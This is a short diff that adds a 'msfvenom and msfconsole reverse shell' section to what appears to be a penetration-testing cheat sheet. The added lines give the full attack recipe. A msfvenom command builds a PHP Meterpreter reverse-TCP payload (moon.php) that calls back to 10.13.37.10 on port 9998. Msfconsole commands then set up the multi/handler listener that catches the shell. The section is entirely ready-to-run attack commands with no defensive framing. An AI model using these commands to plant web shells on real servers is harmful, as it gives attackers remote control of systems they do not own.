@@ -36,5 +36,16 @@
 - `jxplorer`
 
 
+### msfvenom and msfconsole reverse shell
+
+- `msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.10 lport=9998 -o moon.php`
+
+#msfconsole
+- `use exploit/multi/handler`
+- `set payload php/meterpreter_reverse_tcp`
+- `set LHOST yourip`
+- `set LPORT  9998`
+- `run`
+
 
 
